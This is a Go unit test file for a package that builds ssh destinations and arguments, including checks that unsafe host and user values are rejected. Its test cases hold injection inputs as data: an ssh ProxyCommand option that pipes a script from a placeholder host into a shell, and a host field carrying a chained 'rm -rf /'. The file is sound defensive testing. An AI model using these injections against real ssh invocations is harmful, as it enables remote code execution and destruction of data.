package remote

import (
	"errors"
	"strings"
	"testing"
)

func TestNewTargetDefaultsToRoot(t *testing.T) {
	tg, err := NewTarget("203.0.113.9", "")
	if err != nil {
		t.Fatalf("NewTarget: %v", err)
	}
	if tg.String() != "root@203.0.113.9" {
		t.Errorf("String() = %q, want root@203.0.113.9", tg.String())
	}
}

// ssh has no "--" sentinel, so a host or user beginning with "-" is parsed as
// an option. -oProxyCommand=... in that position executes a local command.
func TestNewTargetRejectsOptionLikeValues(t *testing.T) {
	for _, tc := range []struct{ host, user string }{
		{"-oProxyCommand=curl evil.sh|sh", "root"},
		{"203.0.113.9", "-oProxyCommand=x"},
		{"203.0.113.9; rm -rf /", "root"},
		{"203.0.113.9", "ro ot"},
		{"", "root"},
		{"2001:db8::1", "root"}, // ':' excluded — would split a destination
	} {
		if _, err := NewTarget(tc.host, tc.user); !errors.Is(err, ErrUnsafeTarget) {
			t.Errorf("NewTarget(%q, %q) err = %v, want ErrUnsafeTarget", tc.host, tc.user, err)
		}
	}
}

func TestSSHArgsAllocatesATTYAndCarriesTheCommand(t *testing.T) {
	tg, _ := NewTarget("203.0.113.9", "root")
	got := SSHArgs(tg, "cbx setup")

	// -t must come first and must be present: without a tty the interactive
	// Claude Code login cannot render or accept input.
	if got[0] != "-t" {
		t.Errorf("argv[0] = %q, want -t", got[0])
	}
	joined := strings.Join(got, " ")
	for _, want := range []string{"StrictHostKeyChecking=accept-new", "ConnectTimeout=15", "root@203.0.113.9", "cbx setup"} {
		if !strings.Contains(joined, want) {
			t.Errorf("argv missing %q: %s", want, joined)
		}
	}
	// The destination must precede the remote command, or ssh reads the
	// command as the destination.
	if idxOf(got, "root@203.0.113.9") > idxOf(got, "cbx setup") {
		t.Errorf("destination must come before the remote command: %s", joined)
	}
}

func idxOf(ss []string, s string) int {
	for i, v := range ss {
		if v == s {
			return i
		}
	}
	return -1
}
